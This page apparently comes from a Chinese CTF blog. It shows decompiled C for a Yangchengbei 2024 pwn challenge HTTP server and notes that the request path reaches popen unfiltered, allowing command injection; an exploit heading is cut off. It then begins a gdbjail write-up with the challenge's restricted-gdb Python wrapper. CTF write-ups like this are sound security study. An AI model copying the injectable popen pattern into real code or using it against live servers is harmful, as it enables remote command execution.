    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Can't parse request."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> !fgets<span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">,</span> stdin<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Missing Host."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  has_host <span class="token operator">=</span> strstr<span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token string">"Host: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> !has_host <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Missing Host."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v22 <span class="token operator">=</span> strstr<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v22 <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token operator">*</span>v22 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    v22 <span class="token operator">=</span> strchr<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v22 <span class="token punctuation">)</span>
      <span class="token operator">*</span>v22 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> strlen<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">7</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Host len error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> has_host <span class="token operator">==</span> <span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">6</span> <span class="token operator">|</span><span class="token operator">|</span> !has_host<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Host fmt error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v42 <span class="token operator">=</span> <span class="token operator">&amp;</span>v17<span class="token punctuation">;</span>
  HIDWORD<span class="token punctuation">(</span>v41<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>v16<span class="token punctuation">;</span>
  __isoc99_sscanf<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">"%d.%d.%d.%d%c"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v13<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v14<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v15<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> !fgets<span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">,</span> stdin<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Missing Content-Length."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  has_host <span class="token operator">=</span> strstr<span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token string">"Content-Length: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> !has_host <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Missing Content-Length."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v22 <span class="token operator">=</span> strstr<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v22 <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token operator">*</span>v22 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    v22 <span class="token operator">=</span> strchr<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v22 <span class="token punctuation">)</span>
      <span class="token operator">*</span>v22 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> strlen<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Content-Length len too long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> strcasecmp<span class="token punctuation">(</span>httpMethod<span class="token punctuation">,</span> <span class="token string">"get"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">501</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Not Implemented"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"That method is not implemented."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> strncmp<span class="token punctuation">(</span>httpVersion<span class="token punctuation">,</span> <span class="token string">"HTTP/1.0"</span><span class="token punctuation">,</span> 8u<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Bad protocol."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> requestPath <span class="token operator">!=</span> <span class="token number">47</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Bad filename."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  haystack <span class="token operator">=</span> v37<span class="token punctuation">;</span>
  urldecode<span class="token punctuation">(</span>v37<span class="token punctuation">,</span> v37<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> !<span class="token operator">*</span>haystack <span class="token punctuation">)</span>
    haystack <span class="token operator">=</span> <span class="token string">"./"</span><span class="token punctuation">;</span>
  v20 <span class="token operator">=</span> strlen<span class="token punctuation">(</span>haystack<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>haystack <span class="token operator">==</span> <span class="token string">'/'</span>                         <span class="token operator">//</span> 目录穿越检查
    <span class="token operator">|</span><span class="token operator">|</span> !strcmp<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token string">".."</span><span class="token punctuation">)</span>
    <span class="token operator">|</span><span class="token operator">|</span> !strncmp<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token string">"../"</span><span class="token punctuation">,</span> 3u<span class="token punctuation">)</span>
    <span class="token operator">|</span><span class="token operator">|</span> strstr<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token string">"/../"</span><span class="token punctuation">)</span>
    <span class="token operator">|</span><span class="token operator">|</span> !strcmp<span class="token punctuation">(</span><span class="token operator">&amp;</span>haystack<span class="token punctuation">[</span>v20 <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"/.."</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Illegal filename."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> !sub_1F74<span class="token punctuation">(</span>haystack<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Not Found"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Invalid file name."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> fileno<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
  stdout_fd <span class="token operator">=</span> dup<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> fileno<span class="token punctuation">(</span>stderr<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v24 <span class="token operator">=</span> dup<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  freopen<span class="token punctuation">(</span><span class="token string">"/dev/null"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
  freopen<span class="token punctuation">(</span><span class="token string">"/dev/null"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> stderr<span class="token punctuation">)</span><span class="token punctuation">;</span>
  stream <span class="token operator">=</span> popen<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> modes<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> stream <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    pclose<span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
    v6 <span class="token operator">=</span> fileno<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
    dup2<span class="token punctuation">(</span>stdout_fd<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
    v7 <span class="token operator">=</span> fileno<span class="token punctuation">(</span>stderr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    dup2<span class="token punctuation">(</span>v24<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
    close<span class="token punctuation">(</span>stdout_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
    close<span class="token punctuation">(</span>v24<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> stat<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v29<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
      puts_error<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Not Found"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"File not found."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v29<span class="token punctuation">.</span>st_mode <span class="token operator">&amp;</span> <span class="token number">0xF000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x4000</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> haystack<span class="token punctuation">[</span>v20 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">47</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        snprintf<span class="token punctuation">(</span>v40<span class="token punctuation">,</span> 0x4E20u<span class="token punctuation">,</span> <span class="token string">"Location: %s/"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>requestPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
        puts_error<span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Found"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span>v40<span class="token punctuation">,</span> <span class="token string">"Directories must end with a slash."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      snprintf<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> 0x4E20u<span class="token punctuation">,</span> <span class="token string">"%sindex.html"</span><span class="token punctuation">,</span> haystack<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> stat<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v29<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        sub_23D9<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"Ok"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> v29<span class="token punctuation">.</span>st_mtim<span class="token punctuation">.</span>tv_sec<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v26 <span class="token operator">=</span> scandir<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token operator">&amp;</span>namelist<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>const void <span class="token operator">*</span><span class="token punctuation">,</span> const void <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>alphasort<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v26 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v26<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span>
          <span class="token punctuation">&#123;</span>
            sub_2704<span class="token punctuation">(</span>v32<span class="token punctuation">,</span> 0x3E8u<span class="token punctuation">,</span> <span class="token punctuation">(</span>unsigned __int8 <span class="token operator">*</span><span class="token punctuation">)</span>namelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span>d_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
            snprintf<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> 0x4E20u<span class="token punctuation">,</span> <span class="token string">"%s/%s"</span><span class="token punctuation">,</span> haystack<span class="token punctuation">,</span> namelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span>d_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> lstat<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v29<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
              v8 <span class="token operator">=</span> localtime<span class="token punctuation">(</span><span class="token operator">&amp;</span>v29<span class="token punctuation">.</span>st_mtim<span class="token punctuation">.</span>tv_sec<span class="token punctuation">)</span><span class="token punctuation">;</span>
              strftime<span class="token punctuation">(</span>v31<span class="token punctuation">,</span> 0x10u<span class="token punctuation">,</span> <span class="token string">"%d%b%Y %H:%M"</span><span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>
              printf<span class="token punctuation">(</span><span class="token string">"&lt;a href=\"%s\">%-32.32s&lt;/a>%15s %14lld\n"</span><span class="token punctuation">,</span> v32<span class="token punctuation">,</span> namelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span>d_name<span class="token punctuation">,</span> v31<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v29<span class="token punctuation">.</span>st_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
              sub_20C6<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">&#123;</span>
              printf<span class="token punctuation">(</span><span class="token string">"&lt;a href=\"%s\">%-32.32s&lt;/a>    ???\n"</span><span class="token punctuation">,</span> v32<span class="token punctuation">,</span> namelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span>d_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            printf<span class="token punctuation">(</span>
              <span class="token string">"&lt;/pre>\n&lt;hr>\n&lt;address>&lt;a href=\"%s\">%s&lt;/a>&lt;/address>\n&lt;/body>&lt;/html>\n"</span><span class="token punctuation">,</span>
              <span class="token string">"https://2024ycb.dasctf.com/"</span><span class="token punctuation">,</span>
              <span class="token string">"YCB2024"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">&#123;</span>
          perror<span class="token punctuation">(</span><span class="token string">"scandir"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        goto LABEL_74<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      haystack <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    v27 <span class="token operator">=</span> fopen<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> !v27 <span class="token punctuation">)</span>
      puts_error<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Forbidden"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"File is protected."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    tv_sec <span class="token operator">=</span> v29<span class="token punctuation">.</span>st_mtim<span class="token punctuation">.</span>tv_sec<span class="token punctuation">;</span>
    st_size <span class="token operator">=</span> v29<span class="token punctuation">.</span>st_size<span class="token punctuation">;</span>
    v11 <span class="token operator">=</span> sub_2566<span class="token punctuation">(</span>haystack<span class="token punctuation">)</span><span class="token punctuation">;</span>
    sub_23D9<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"Ok"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span>v11<span class="token punctuation">,</span> st_size<span class="token punctuation">,</span> tv_sec<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      c <span class="token operator">=</span> getc<span class="token punctuation">(</span>v27<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> c <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      putchar<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
LABEL_74<span class="token punctuation">:</span>
    fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v44 <span class="token operator">!=</span> __readgsdword<span class="token punctuation">(</span>0x14u<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    check_canary<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>程序的逻辑很长，实现了一个http request parse，然后相应请求，大多数逻辑都是对http request的格式做判断，还有目录穿越的检查</p>
<p>漏洞出在这里popen这里</p>


<p>这个popen会fork一个子进程，然后调用shell，把参数传过去，也没有做过滤，所以可以通过这里执行命令</p>


<p>exp</p>
	
	</div>
  <a type="button" href="/2024/09/04/羊城杯2024pwn/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2024/09/02/gdbjail/" >gdbjail</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2024-09-02  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>题目附件<a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/gdbjail">https://github.com/nyyyddddn/ctf/tree/main/gdbjail</a></p>
<p>最近在ImaginaryCTF看到两个关于gdbjail的题目，觉得挺有意思的，远程提供了一个受限的gdb调试环境，限制交互的时候使用的命令，目的是利用限制的命令去实现getshell，或者是将flag读出来。</p>
<p>没用过没装插件的gdb，不装插件挺难用的</p>
<h1 id="gdbjail1"><a href="#gdbjail1" class="headerlink" title="gdbjail1"></a>gdbjail1</h1><p>run.sh</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>

gdb <span class="token parameter variable">-x</span> /home/user/gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>gdbinit</p>
<pre class="line-numbers language-none"><code class="language-none">source &#x2F;home&#x2F;user&#x2F;main.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>main.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gdb

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"file /bin/cat"</span><span class="token punctuation">)</span>
    gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"break read"</span><span class="token punctuation">)</span>
    gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"run"</span><span class="token punctuation">)</span>

    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            command <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"(gdb) "</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> command<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"break"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> command<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> command<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"continue"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>command<span class="token punctuation">)</span>
                <span class="token keyword">except</span> gdb<span class="token punctuation">.</span>error <span class="token keyword">as</span> e<span class="token punctuation">:</span>
